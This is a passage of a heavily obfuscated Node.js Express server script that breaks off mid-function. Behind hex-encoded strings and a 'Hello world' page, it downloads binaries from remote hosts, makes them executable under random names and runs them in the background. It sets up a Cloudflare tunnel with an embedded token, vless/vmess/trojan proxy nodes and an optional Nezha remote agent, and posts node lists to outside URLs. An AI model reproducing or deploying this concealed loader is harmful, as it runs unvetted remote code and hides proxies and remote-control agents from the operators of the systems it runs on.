const _0x1f12eb = _0x264a;
(function (_0x3968c8, _0x4994c8) {
    const _0x865880 = _0x264a;
    const _0x3fc4b0 = _0x3968c8();
    while (!![]) {
        try {
            const _0x3bcffb = parseInt(_0x865880(0x208)) / 0x1 * (parseInt(_0x865880(0x1da)) / 0x2) + parseInt(_0x865880(0xc3)) / 0x3 + -parseInt(_0x865880(0x1bf)) / 0x4 + parseInt(_0x865880(0x1e8)) / 0x5 * (-parseInt(_0x865880(0x1c2)) / 0x6) + parseInt(_0x865880(0x205)) / 0x7 + -parseInt(_0x865880(0x200)) / 0x8 + -parseInt(_0x865880(0xd4)) / 0x9 * (-parseInt(_0x865880(0x107)) / 0xa);
            if (_0x3bcffb === _0x4994c8) {
                break;
            } else {
                _0x3fc4b0['push'](_0x3fc4b0['shift']());
            }
        } catch (_0x195cb5) {
            _0x3fc4b0['push'](_0x3fc4b0['shift']());
        }
    }
}(_0x5924, 0x8e598));
const express = require('\x65\x78\x70\x72\x65\x73\x73');
const app = express();
const axios = require(_0x1f12eb(0x169));
const os = require('\x6f\x73');
const fs = require('\x66\x73');
const path = require(_0x1f12eb(0x13b));
const {promisify} = require(_0x1f12eb(0xcb));
const exec = promisify(require(_0x1f12eb(0x1fd) + _0x1f12eb(0x165))[_0x1f12eb(0x1d0)]);
const {execSync} = require(_0x1f12eb(0x1fd) + _0x1f12eb(0x165));
const UPLOAD_URL = process[_0x1f12eb(0x112)][_0x1f12eb(0x1ef)] || '';
const PROJECT_URL = process[_0x1f12eb(0x112)][_0x1f12eb(0x152) + '\x4c'] || '';
const AUTO_ACCESS = process[_0x1f12eb(0x112)][_0x1f12eb(0x118) + '\x53'] || ![];
const FILE_PATH = process[_0x1f12eb(0x112)][_0x1f12eb(0xe0)] || _0x1f12eb(0x178);
const SUB_PATH = process[_0x1f12eb(0x112)][_0x1f12eb(0x1fa)] || _0x1f12eb(0x155) + _0x1f12eb(0x121) + _0x1f12eb(0x17e) + _0x1f12eb(0x192);
const PORT = process[_0x1f12eb(0x112)][_0x1f12eb(0x1bc) + '\x54'] || process[_0x1f12eb(0x112)][_0x1f12eb(0x150)] || 0xbb8;
const UUID = process[_0x1f12eb(0x112)][_0x1f12eb(0xdb)] || _0x1f12eb(0x155) + _0x1f12eb(0x121) + '\x61\x33\x61\x2d\x36\x64\x32\x31\x31\x30' + '\x34\x36\x38\x64\x62\x33';
const NEZHA_SERVER = process[_0x1f12eb(0x112)][_0x1f12eb(0x1cb) + '\x45\x52'] || '';
const NEZHA_PORT = process[_0x1f12eb(0x112)][_0x1f12eb(0x1a0)] || '';
const NEZHA_KEY = process[_0x1f12eb(0x112)]['\x4e\x45\x5a\x48\x41\x5f\x4b\x45\x59'] || '';
const ARGO_DOMAIN = process[_0x1f12eb(0x112)][_0x1f12eb(0xbd) + '\x4e'] || _0x1f12eb(0xd3) + '\x37\x2e\x34\x2e\x30\x2e\x31\x2e\x30\x2e' + '\x30\x2e\x32\x2e\x69\x70\x36\x2e\x61\x72' + '\x70\x61';
const ARGO_AUTH = process[_0x1f12eb(0x112)]['\x41\x52\x47\x4f\x5f\x41\x55\x54\x48'] || _0x1f12eb(0x1bd) + _0x1f12eb(0x18b) + _0x1f12eb(0x13c) + _0x1f12eb(0x1f3) + '\x59\x57\x59\x31\x4d\x7a\x51\x35\x4e\x57' + '\x45\x69\x4c\x43\x4a\x30\x49\x6a\x6f\x69' + _0x1f12eb(0xef) + _0x1f12eb(0xe6) + _0x1f12eb(0x105) + '\x41\x74\x4d\x57\x46\x68\x4f\x57\x59\x34' + '\x59\x6a\x49\x33\x59\x6d\x51\x31\x49\x69' + '\x77\x69\x63\x79\x49\x36\x49\x6b\x31\x48' + '\x57\x54\x42\x5a\x65\x6d\x4d\x78\x54\x6d' + '\x31\x52\x64\x46\x70\x58\x55\x58\x6c\x4e' + _0x1f12eb(0x1dc) + _0x1f12eb(0xe8) + _0x1f12eb(0x1a1) + '\x64\x4e\x56\x31\x5a\x72\x54\x55\x52\x72' + '\x65\x69\x4a\x39';
const ARGO_PORT = process[_0x1f12eb(0x112)][_0x1f12eb(0x188)] || 0x682c;
const CFIP = process[_0x1f12eb(0x112)][_0x1f12eb(0x1a4)] || _0x1f12eb(0x142) + '\x6e';
const CFPORT = process[_0x1f12eb(0x112)][_0x1f12eb(0x13a)] || 0x1bb;
const NAME = process['\x65\x6e\x76'][_0x1f12eb(0x1c9)] || _0x1f12eb(0x125);
if (!fs[_0x1f12eb(0xc7)](FILE_PATH)) {
    fs[_0x1f12eb(0x1f9)](FILE_PATH);
    console[_0x1f12eb(0xbf)](FILE_PATH + (_0x1f12eb(0x214) + '\x64'));
} else {
    console[_0x1f12eb(0xbf)](FILE_PATH + (_0x1f12eb(0xf7) + _0x1f12eb(0x207)));
}
function generateRandomName() {
    const _0xdbd7c4 = _0x1f12eb;
    const _0xa3ec98 = '\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a' + _0xdbd7c4(0x191) + '\x75\x76\x77\x78\x79\x7a';
    let _0x4d709f = '';
    for (let _0x164171 = 0x0; _0x164171 < 0x6; _0x164171++) {
        _0x4d709f += _0xa3ec98[_0xdbd7c4(0x1ce)](Math[_0xdbd7c4(0xf5)](Math[_0xdbd7c4(0x1db)]() * _0xa3ec98['\x6c\x65\x6e\x67\x74\x68']));
    }
    return _0x4d709f;
}
const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
function _0x264a(_0x1a1405, _0x442d5e) {
    const _0x592418 = _0x5924();
    _0x264a = function (_0x264a1c, _0x47f35f) {
        _0x264a1c = _0x264a1c - 0xb8;
        let _0x528787 = _0x592418[_0x264a1c];
        return _0x528787;
    };
    return _0x264a(_0x1a1405, _0x442d5e);
}
const phpName = generateRandomName();
let npmPath = path[_0x1f12eb(0xf0)](FILE_PATH, npmName);
let phpPath = path[_0x1f12eb(0xf0)](FILE_PATH, phpName);
let webPath = path['\x6a\x6f\x69\x6e'](FILE_PATH, webName);
let botPath = path['\x6a\x6f\x69\x6e'](FILE_PATH, botName);
let subPath = path['\x6a\x6f\x69\x6e'](FILE_PATH, '\x73\x75\x62\x2e\x74\x78\x74');
let listPath = path[_0x1f12eb(0xf0)](FILE_PATH, _0x1f12eb(0x1e4));
let bootLogPath = path[_0x1f12eb(0xf0)](FILE_PATH, _0x1f12eb(0x128));
function _0x5924() {
    const _0x570c32 = [
        '\x72\x61\x6e\x64\x6f\x6d',
        '\x65\x54\x41\x77\x54\x6d\x70\x4f\x61\x30',
        '\x20\x66\x61\x6c\x73\x65\x0a\x64\x69\x73',
        '\x41\x70\x70\x20\x69\x73\x20\x72\x75\x6e',
        '\x73\x61\x62\x6c\x65\x5f\x6e\x61\x74\x3a',
        '\x20\x2d\x63\x20\x22',
        '\x71\x75\x65\x72\x79\x3a\x20\x66\x61\x6c',
        '\x75\x6e\x73\x68\x69\x66\x74',
        '\x6d\x61\x70',
        '\x6c\x69\x73\x74\x2e\x74\x78\x74',
        '\x62\x6c\x61\x63\x6b\x68\x6f\x6c\x65',
        '\x6f\x6b\x65\x6e\x20',
        '\x68\x74\x74\x70\x20\x73\x65\x72\x76\x65',
        '\x36\x39\x36\x30\x38\x35\x59\x71\x4d\x6a\x7a\x4e',
        '\x70\x68\x70\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x2f\x74\x75\x6e\x6e\x65\x6c\x2e\x79\x6d',
        '\x6c\x20\x32\x3e\x26\x31\x20\x26',
        '\x70\x32\x20\x2d\x2d\x6c\x6f\x67\x66\x69',
        '\x2f\x76\x6d\x65\x73\x73\x2d\x61\x72\x67',
        '\x65\x3a\x20\x74\x72\x75\x65\x0a\x64\x69',
        '\x55\x50\x4c\x4f\x41\x44\x5f\x55\x52\x4c',
        '\x65\x3a\x20\x68\x74\x74\x70\x5f\x73\x74',
        '\x70\x6b\x69\x6c\x6c\x20\x2d\x66\x20\x22',
        '\x32\x30\x39\x36',
        '\x45\x34\x5a\x44\x4e\x68\x4d\x6a\x63\x31',
        '\x73\x73\x20\x74\x61\x73\x6b',
        '\x6c\x65\x20',
        '\x65\x3a\x20\x66\x61\x6c\x73\x65\x0a\x75',
        '\x5f\x2f\x67\x27',
        '\x61\x74\x75\x73\x3a\x34\x30\x34\x0a\x20',
        '\x6d\x6b\x64\x69\x72\x53\x79\x6e\x63',
        '\x53\x55\x42\x5f\x50\x41\x54\x48',
        '\x61\x72\x6d\x36\x34',
        '\x45\x72\x72\x6f\x72\x20\x64\x6f\x77\x6e',
        '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63',
        '\x74\x75\x6e\x6e\x65\x6c\x2e\x79\x6d\x6c',
        '\x73\x74\x72\x69\x6e\x67\x69\x66\x79',
        '\x35\x31\x35\x33\x39\x39\x32\x6b\x72\x43\x41\x76\x65',
        '\x20\x69\x73\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x73\x74\x72\x65\x61\x6d',
        '\x72\x74\x5f\x64\x65\x6c\x61\x79\x3a\x20',
        '\x6c\x65\x73\x73\x2d\x61\x72\x67\x6f\x25',
        '\x37\x31\x33\x34\x30\x37\x38\x6f\x73\x6b\x73\x52\x5a',
        '\x74\x20\x66\x61\x69\x6c\x65\x64\x20\x66',
        '\x78\x69\x73\x74\x73',
        '\x37\x69\x46\x42\x76\x78\x77',
        '\x68\x74\x74\x70',
        '\x75\x74\x66\x2d\x38',
        '\x74\x65\x73\x74',
        '\x6c\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6c',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6f\x6f',
        '\x0a\x20\x20\x74\x75\x6e\x6e\x65\x6c\x3a',
        '\x63\x72\x65\x61\x74\x65\x57\x72\x69\x74',
        '\x6c\x6f\x61\x64\x69\x6e\x67\x20\x66\x69',
        '\x6e\x2f\x6a\x73\x6f\x6e',
        '\x6e\x3d\x6e\x6f\x6e\x65\x26\x73\x65\x63',
        '\x61\x62\x6c\x65\x20\x69\x73\x20\x65\x6d',
        '\x20\x69\x73\x20\x63\x72\x65\x61\x74\x65',
        '\x73\x74\x61\x74\x75\x73',
        '\x63\x61\x74\x63\x68',
        '\x0a\x63\x6c\x69\x65\x6e\x74\x5f\x73\x65',
        '\x79\x63\x2e\x6d\x6e\x2f\x61\x67\x65\x6e',
        '\x54\x75\x6e\x6e\x65\x6c\x53\x65\x63\x72',
        '\x41\x52\x47\x4f\x5f\x44\x4f\x4d\x41\x49',
        '\x66\x72\x6f\x6d',
        '\x6c\x6f\x67',
        '\x63\x72\x65\x74\x3a\x20',
        '\x6d\x65\x73\x73\x61\x67\x65',
        '\x2f\x62\x6f\x6f\x74\x2e\x6c\x6f\x67\x20',
        '\x31\x36\x33\x39\x35\x77\x50\x41\x64\x73\x61',
        '\x73\x65\x6e\x64',
        '\x0a\x64\x69\x73\x61\x62\x6c\x65\x5f\x66',
        '\x67\x69\x6e\x52\x65\x71\x75\x65\x73\x74',
        '\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63',
        '\x2f\x61\x70\x69\x2f\x61\x64\x64\x2d\x6e',
        '\x6e\x74\x3a\x20\x74\x72\x75\x65\x0a\x73',
        '\x74\x61\x72\x74\x73\x65\x72\x76\x65\x72',
        '\x75\x74\x69\x6c',
        '\x6f\x6e\x20\x3e\x2f\x64\x65\x76\x2f\x6e',
        '\x2d\x2d\x73\x6b\x69\x70\x2d\x63\x6f\x6e',
        '\x75\x72\x69\x74\x79\x3d\x74\x6c\x73\x26',
        '\x61\x6c\x6c',
        '\x2f\x6e\x75\x6c\x6c\x20\x32\x3e\x26\x31',
        '\x73\x69\x6f\x6e\x20\x61\x75\x74\x6f\x20',
        '\x72\x6f\x63\x73\x20\x3e\x2f\x64\x65\x76',
        '\x38\x2e\x30\x2e\x34\x2e\x66\x2e\x30\x2e',
        '\x31\x38\x64\x42\x43\x6a\x78\x41',
        '\x65\x53\x74\x72\x65\x61\x6d',
        '\x75\x62\x73\x63\x72\x69\x70\x74\x69\x6f',
        '\x6e\x67\x20\x62\x6f\x74\x20\x74\x6f\x20',
        '\x68\x74\x74\x70\x73\x2b\x6c\x6f\x63\x61',
        '\x41\x64\x64\x20\x61\x75\x74\x6f\x6d\x61',
        '\x61\x61\x72\x63\x68\x36\x34',
        '\x55\x55\x49\x44',
        '\x6c\x3a\x2f\x2f\x38\x2e\x38\x2e\x38\x2e',
        '\x0a\x76\x6c\x65\x73\x73\x3a\x2f\x2f',
        '\x78\x74\x6c\x73\x2d\x72\x70\x72\x78\x2d',
        '\x66\x69\x72\x65\x66\x6f\x78',
        '\x46\x49\x4c\x45\x5f\x50\x41\x54\x48',
        '\x67\x20\x65\x72\x72\x6f\x72\x3a\x20',
        '\x75\x6e\x74\x72\x79\x5f\x63\x6f\x64\x65',
        '\x77\x69\x6e\x33\x32',
        '\x6f\x6e\x20\x75\x70\x6c\x6f\x61\x64\x65',
        '\x3b\x20\x63\x68\x61\x72\x73\x65\x74\x3d',
        '\x55\x74\x4e\x7a\x56\x6a\x5a\x53\x30\x30',
        '\x63\x6c\x65\x61\x72',
        '\x78\x55\x61\x33\x70\x4f\x62\x55\x56\x30',
        '\x69\x63\x6b\x20\x74\x75\x6e\x6e\x65\x6c',
        '\x78\x26\x74\x79\x70\x65\x3d\x77\x73\x26',
        '\x67\x65\x74',
        '\x6c\x6c\x79',
        '\x6c\x3a\x20\x68\x74\x74\x70\x32\x0a\x20',
        '\x48\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c',
        '\x5a\x44\x4d\x77\x59\x54\x64\x69\x5a\x47',
        '\x6a\x6f\x69\x6e',
        '\x72\x65\x61\x64\x46\x69\x6c\x65\x53\x79',
        '\x73\x75\x62\x73\x74\x72\x69\x6e\x67',
        '\x0a\x20\x20\x20\x20',
        '\x70\x6c\x61\x74\x66\x6f\x72\x6d',
        '\x66\x6c\x6f\x6f\x72',
        '\x68\x61\x73',
        '\x20\x61\x6c\x72\x65\x61\x64\x79\x20\x65',
        '\x6d\x61\x74\x69\x63\x20\x61\x63\x63\x65',
        '\x75\x6e\x6c\x69\x6e\x6b',
        '\x66\x69\x6c\x65\x55\x72\x6c',
        '\x61\x63\x63\x65\x73\x73\x20\x74\x61\x73',
        '\x74\x2d\x64\x65\x6c\x61\x79\x20\x34\x20',
        '\x20\x69\x6e\x66\x6f\x20\x2d\x2d\x75\x72',
        '\x66\x6f\x72\x45\x61\x63\x68',
        '\x75\x72\x65\x3a\x20\x66\x61\x6c\x73\x65',
        '\x6f\x63\x61\x6c\x68\x6f\x73\x74\x3a',
        '\x70\x69\x70\x65',
        '\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66',
        '\x74\x2c\x20\x65\x6e\x6a\x6f\x79\x21',
        '\x2d\x2d\x63\x6f\x6e\x66\x69\x67\x20',
        '\x4f\x47\x4a\x6d\x4c\x57\x45\x33\x4d\x44',
        '\x6e\x67\x20\x6f\x6e\x20\x70\x6f\x72\x74',
        '\x37\x34\x37\x34\x34\x36\x30\x6c\x65\x64\x77\x4c\x50',
        '\x66\x69\x6e\x69\x73\x68',
        '\x64\x20\x2d\x65\x20\x27\x73\x2f\x20\x2f',
        '\x79\x3a\x20\x74\x72\x75\x65\x0a\x20\x20',
        '\x72\x20\x69\x73\x20\x72\x75\x6e\x6e\x69',
        '\x2f\x76\x6c\x65\x73\x73\x2d\x61\x72\x67',
        '\x63\x6f\x75\x6e\x74\x3a\x20\x74\x72\x75',
        '\x74\x65\x20\x2d\x2d\x72\x65\x70\x6f\x72',
        '\x66\x20\x2f\x69\x6d\x20',
        '\x73\x3a\x0a\x20\x20\x20\x20\x2d\x20\x68',
        '\x72\x6f\x6a\x61\x6e\x2d\x61\x72\x67\x6f',
        '\x65\x6e\x76',
        '\x64\x61\x74\x61',
        '\x2d\x61\x75\x74\x6f\x2d\x75\x70\x64\x61',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x6d',
        '\x32\x30\x35\x33',
        '\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f',
        '\x41\x55\x54\x4f\x5f\x41\x43\x43\x45\x53',
        '\x68\x6f\x73\x74\x3d',
        '\x65\x5f\x61\x75\x74\x6f\x5f\x75\x70\x64',
        '\x70\x65\x65\x64\x2e\x63\x6c\x6f\x75\x64',
        '\x74\x6f\x53\x74\x72\x69\x6e\x67',
        '\x20\x2d\x70\x20',
        '\x70\x6f\x70',
        '\x61\x6e\x64\x3a\x20',
        '\x65\x72\x72\x6f\x72',
        '\x66\x63\x33\x2d\x34\x36\x33\x65\x2d\x38',
        '\x64\x69\x73\x61\x62\x6c\x65\x5f\x63\x6f',
        '\x71\x75\x69\x63',
        '\x6e\x65\x74\x2f\x61\x64\x64\x2d\x75\x72',
        '\x6a\x75\x73\x74',
        '\x72\x6d\x20\x2d\x72\x66\x20',
        '\x2d\x2d\x6e\x6f\x2d\x61\x75\x74\x6f\x75',
        '\x62\x6f\x6f\x74\x2e\x6c\x6f\x67',
        '\x70\x64\x61\x74\x65\x20\x2d\x2d\x70\x72',
        '\x72\x74\x5f\x70\x65\x72\x69\x6f\x64\x3a',
        '\x75\x6c\x6c\x20\x32\x3e\x26\x31',
        '\x0a\x64\x65\x62\x75\x67\x3a\x20\x66\x61',
        '\x79\x6e\x63',
        '\x75\x74\x69\x6e\x67\x20\x63\x6f\x6d\x6d',
        '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79',
        '\x53\x6b\x69\x70\x70\x69\x6e\x67\x20\x61',
        '\x64\x65\x6c\x20\x2f\x66\x20\x2f\x71\x20',
        '\x63\x68\x6d\x6f\x64',
        '\x6b\x20\x61\x64\x64\x65\x64\x20\x73\x75',
        '\x66\x6f\x72\x20',
        '\x6c\x65\x73\x3a',
        '\x45\x6d\x70\x6f\x77\x65\x72\x6d\x65\x6e',
        '\x65\x0a\x74\x65\x6d\x70\x65\x72\x61\x74',
        '\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x20',
        '\x6c\x73\x65\x0a\x69\x6e\x73\x65\x63\x75',
        '\x43\x46\x50\x4f\x52\x54',
        '\x70\x61\x74\x68',
        '\x5a\x47\x59\x35\x4d\x6a\x4d\x34\x4e\x6d',
        '\x65\x63\x74\x69\x6f\x6e\x5f\x63\x6f\x75',
        '\x4e\x20\x6f\x72\x20\x41\x52\x47\x4f\x5f',
        '\x20\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73',
        '\x70\x32\x20\x72\x75\x6e\x20\x2d\x2d\x74',
        '\x6e\x6f\x68\x75\x70\x20',
        '\x77\x77\x77\x2e\x76\x69\x73\x61\x2e\x63',
        '\x69\x6e\x67\x20\x62\x6f\x6f\x74\x2e\x6c',
        '\x64\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e',
        '\x62\x61\x73\x65\x36\x34',
        '\x26\x66\x70\x3d\x66\x69\x72\x65\x66\x6f',
        '\x6e\x6f\x6e\x65',
        '\x20\x0a\x20\x20\x69\x6e\x67\x72\x65\x73',
        '\x0a\x73\x6b\x69\x70\x5f\x63\x6f\x6e\x6e',
        '\x76\x6c\x65\x73\x73',
        '\x32\x30\x38\x33',
        '\x3a\x2f\x2f\x6c\x6f\x63\x61\x6c\x68\x6f',
        '\x62\x61\x73\x65\x6e\x61\x6d\x65',
        '\x20\x2d\x63\x20',
        '\x74\x6c\x73',
        '\x50\x4f\x52\x54',
        '\x75\x6e\x6e\x65\x6c\x53\x65\x63\x72\x65',
        '\x50\x52\x4f\x4a\x45\x43\x54\x5f\x55\x52',
        '\x73\x70\x6c\x69\x74',
        '\x70\x74\x79\x2c\x73\x6b\x69\x70\x20\x72',
        '\x66\x62\x35\x37\x63\x32\x66\x36\x2d\x31',
        '\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73',
        '\x75\x6e\x6e\x69\x6e\x67',
        '\x75\x74\x65\x3a\x20\x66\x61\x6c\x73\x65',
        '\x65\x63\x74\x75\x72\x65',
        '\x74\x72\x6f\x6a\x61\x6e',
        '\x20\x3e\x20\x6e\x75\x6c\x20\x32\x3e\x26',
        '\x79\x63\x2e\x6d\x6e\x2f\x62\x6f\x74',
        '\x41\x72\x67\x6f\x44\x6f\x6d\x61\x69\x6e',
        '\x74\x2c\x75\x73\x65\x20\x74\x6f\x6b\x65',
        '\x61\x6d\x64',
        '\x2f\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61',
        '\x74\x75\x6e\x6e\x65\x6c\x20\x2d\x2d\x65',
        '\x69\x73\x46\x69\x6c\x65',
        '\x32\x30\x38\x37',
        '\x0a\x20\x20\x70\x72\x6f\x74\x6f\x63\x6f',
        '\x65\x73\x73',
        '\x20\x2d\x73\x20',
        '\x6f\x6f\x2e\x73\x65\x72\x76\x30\x30\x2e',
        '\x6f\x72\x63\x65\x5f\x75\x70\x64\x61\x74',
        '\x61\x78\x69\x6f\x73',
        '\x69\x64\x3a\x20',
        '\x6d\x69\x73\x6d\x61\x74\x63\x68\x20\x54',
        '\x34\x0a\x73\x65\x72\x76\x65\x72\x3a\x20',
        '\x76\x69\x73\x69\x6f\x6e',
        '\x6f\x3f\x65\x64\x3d\x32\x35\x36\x30',
        '\x20\x61\x20\x66\x69\x6c\x65\x20\x66\x6f',
        '\x73\x65\x5f\x69\x70\x76\x36\x5f\x63\x6f',
        '\x64\x69\x72\x65\x63\x74',
        '\x2d\x2d\x6c\x6f\x67\x6c\x65\x76\x65\x6c',
        '\x38\x34\x34\x33',
        '\x24\x31\x38\x7d\x27\x20\x7c\x20\x73\x65',
        '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x61\x72',
        '\x2d\x2d\x74\x6c\x73',
        '\x20\x31\x38\x30\x30\x0a\x72\x65\x70\x6f',
        '\x2e\x2f\x74\x6d\x70',
        '\x66\x69\x6c\x74\x65\x72',
        '\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f',
        '\x65\x2d\x6e\x6f\x64\x65\x73',
        '\x74\x68\x69\x73\x20\x73\x63\x72\x69\x70',
        '\x6d\x6c\x22\x20\x3e\x2f\x64\x65\x76\x2f',
        '\x61\x33\x61\x2d\x36\x64\x32\x31\x31\x30',
        '\x0a\x20\x20\x20\x20\x20\x20\x73\x65\x72',
        '\x65\x6e\x74\x20\x61\x72\x63\x68\x69\x74',
        '\x34\x34\x33',
        '\x63\x6f\x6e\x66\x69\x67\x2e\x79\x61\x6d',
        '\x77\x72\x69\x74\x65\x46\x69\x6c\x65\x53',
        '\x20\x6e\x6f\x74\x20\x66\x6f\x75\x6e\x64',
        '\x73\x74\x61\x74\x53\x79\x6e\x63',
        '\x45\x72\x72\x6f\x72\x20\x72\x65\x61\x64',
        '\x69\x6e\x74\x20\x24\x32\x36\x22\x2d\x22',
        '\x41\x52\x47\x4f\x5f\x50\x4f\x52\x54',
        '\x61\x72\x6d',
        '\x75\x6e\x6c\x69\x6e\x6b\x53\x79\x6e\x63',
        '\x67\x79\x4e\x6a\x4d\x34\x4d\x32\x59\x79',
        '\x64\x67\x65\x2d\x69\x70\x2d\x76\x65\x72',
        '\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75',
        '\x76\x6d\x65\x73\x73',
        '\x70\x75\x73\x68',
        '\x2f\x73\x75\x62\x2e\x74\x78\x74\x20\x73',
        '\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74',
        '\x34\x36\x38\x64\x62\x33',
        '\x79\x63\x2e\x6d\x6e\x2f\x76\x31',
        '\x77\x65\x62\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x5f\x74\x6f\x5f\x75\x70\x67\x72\x61\x64',
        '\x3a\x2f\x2f',
        '\x6d\x61\x74\x63\x68',
        '\x20\x66\x61\x69\x6c\x65\x64\x3a\x20',
        '\x45\x72\x72\x6f\x72\x20\x69\x6e\x20\x73',
        '\x64\x64\x69\x6e\x67\x20\x61\x75\x74\x6f',
        '\x74\x69\x63\x20\x61\x63\x63\x65\x73\x73',
        '\x45\x72\x72\x6f\x72\x20\x65\x78\x65\x63',
        '\x74\x6c\x73\x26\x73\x6e\x69\x3d',
        '\x0a\x20\x20\x0a\x74\x72\x6f\x6a\x61\x6e',
        '\x2e\x65\x78\x65\x20\x3e\x20\x6e\x75\x6c',
        '\x4e\x45\x5a\x48\x41\x5f\x50\x4f\x52\x54',
        '\x57\x56\x64\x57\x61\x30\x35\x71\x52\x58',
        '\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31',
        '\x3a\x20\x66\x61\x6c\x73\x65\x0a\x75\x75',
        '\x43\x46\x49\x50',
        '\x61\x76\x65\x64\x20\x73\x75\x63\x63\x65',
        '\x6e\x20\x63\x6f\x6e\x6e\x65\x63\x74\x20',
        '\x20\x74\x61\x73\x6b\x20\x66\x61\x69\x6c',
        '\x6d\x65\x74\x61\x20\x7c\x20\x61\x77\x6b',
        '\x6e\x70\x6d\x20\x72\x75\x6e\x6e\x69\x6e',
        '\x63\x6f\x6e\x66\x69\x67\x2e\x6a\x73\x6f',
        '\x61\x64\x65\x64\x20\x73\x75\x63\x63\x65',
        '\x70\x6f\x73\x74',
        '\x41\x52\x47\x4f\x5f\x41\x55\x54\x48\x20',
        '\x69\x61\x6c\x73\x2d\x66\x69\x6c\x65\x3a',
        '\x61\x62\x6c\x65\x5f\x73\x65\x6e\x64\x5f',
        '\x66\x6f\x72\x20\x75\x73\x69\x6e\x67\x20',
        '\x36\x30\x23',
        '\x73\x73\x66\x75\x6c\x6c\x79',
        '\x62\x6c\x6f\x63\x6b',
        '\x66\x69\x6c\x65\x4e\x61\x6d\x65',
        '\x2f\x74\x72\x6f\x6a\x61\x6e\x2d\x61\x72',
        '\x72\x20\x74\x68\x65\x20\x63\x75\x72\x72',
        '\x6f\x67\x3a',
        '\x6d\x6d\x61\x6e\x64\x5f\x65\x78\x65\x63',
        '\x2f\x61\x70\x69\x2f\x61\x64\x64\x2d\x73',
        '\x76\x69\x63\x65\x3a\x20\x68\x74\x74\x70',
        '\x20\x3e\x2f\x64\x65\x76\x2f\x6e\x75\x6c',
        '\x53\x45\x52\x56\x45\x52\x5f\x50\x4f\x52',
        '\x65\x79\x4a\x68\x49\x6a\x6f\x69\x5a\x54',
        '\x0a\x20\x20\x20\x20\x20\x20\x6f\x72\x69',
        '\x34\x34\x32\x31\x32\x34\x30\x49\x68\x51\x70\x43\x68',
        '\x6c\x65\x6e\x67\x74\x68',
        '\x20\x2d\x46\x5c\x22\x20\x27\x7b\x70\x72',
        '\x31\x32\x4e\x57\x62\x47\x52\x53',
        '\x2f\x61\x70\x69\x2f\x64\x65\x6c\x65\x74',
        '\x74\x20\x73\x75\x63\x63\x65\x73\x73\x20',
        '\x6f\x74\x6f\x63\x6f\x6c\x20\x68\x74\x74',
        '\x62\x6c\x65\x20\x69\x73\x20\x65\x6d\x70',
        '\x61\x75\x74\x6f\x6d\x61\x74\x69\x63\x20',
        '\x6f\x44\x6f\x6d\x61\x69\x6e',
        '\x4e\x41\x4d\x45',
        '\x6c\x73\x65\x0a\x64\x69\x73\x61\x62\x6c',
        '\x4e\x45\x5a\x48\x41\x5f\x53\x45\x52\x56',
        '\x6d\x36\x34\x2e\x73\x73\x73\x73\x2e\x6e',
        '\x53\x75\x62\x73\x63\x72\x69\x70\x74\x69',
        '\x63\x68\x61\x72\x41\x74',
        '\x38\x2f\x64\x6e\x73\x2d\x71\x75\x65\x72',
        '\x65\x78\x65\x63',
        '\x79\x63\x2e\x6d\x6e\x2f\x77\x65\x62',
        '\x73\x65\x74',
        '\x74\x75\x6e\x6e\x65\x6c\x2e\x6a\x73\x6f',
        '\x72\x65\x73\x70\x6f\x6e\x73\x65',
        '\x69\x6e\x63\x6c\x75\x64\x65\x73',
        '\x6e\x69\x6e\x67',
        '\x75\x6c\x6c\x79',
        '\x6e\x6f\x54\x4c\x53\x56\x65\x72\x69\x66',
        '\x20\x32\x3e\x26\x31',
        '\x32\x36\x31\x35\x36\x6c\x51\x63\x4a\x6e\x67'
    ];
    _0x5924 = function () {
        return _0x570c32;
    };
    return _0x5924();
}
let configPath = path[_0x1f12eb(0xf0)](FILE_PATH, _0x1f12eb(0x1aa) + '\x6e');
function deleteNodes() {
    const _0x17d61e = _0x1f12eb;
    try {
        if (!UPLOAD_URL)
            return;
        if (!fs['\x65\x78\x69\x73\x74\x73\x53\x79\x6e\x63'](subPath))
            return;
        let _0x2d2aa1;
        try {
            _0x2d2aa1 = fs[_0x17d61e(0xf1) + '\x6e\x63'](subPath, _0x17d61e(0x20a));
        } catch {
            return null;
        }
        const _0x113b52 = Buffer[_0x17d61e(0xbe)](_0x2d2aa1, _0x17d61e(0x145))['\x74\x6f\x53\x74\x72\x69\x6e\x67'](_0x17d61e(0x20a));
        const _0x178189 = _0x113b52[_0x17d61e(0x153)]('\x0a')[_0x17d61e(0x179)](_0x162230 => /(vless|vmess|trojan|hysteria2|tuic):\/\//['\x74\x65\x73\x74'](_0x162230));
        if (_0x178189[_0x17d61e(0x1c0)] === 0x0)
            return;
        axios['\x70\x6f\x73\x74'](UPLOAD_URL + (_0x17d61e(0x1c3) + _0x17d61e(0x17b)), JSON[_0x17d61e(0x1ff)]({ '\x6e\x6f\x64\x65\x73': _0x178189 }), { '\x68\x65\x61\x64\x65\x72\x73': { '\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65': _0x17d61e(0x117) + _0x17d61e(0x211) } })[_0x17d61e(0xb9)](_0x472a19 => {
            return null;
        });
        return null;
    } catch (_0x5672c0) {
        return null;
    }
}
function cleanupOldFiles() {
    const _0x4b7826 = _0x1f12eb;
    try {
        const _0x1af281 = fs['\x72\x65\x61\x64\x64\x69\x72\x53\x79\x6e' + '\x63'](FILE_PATH);
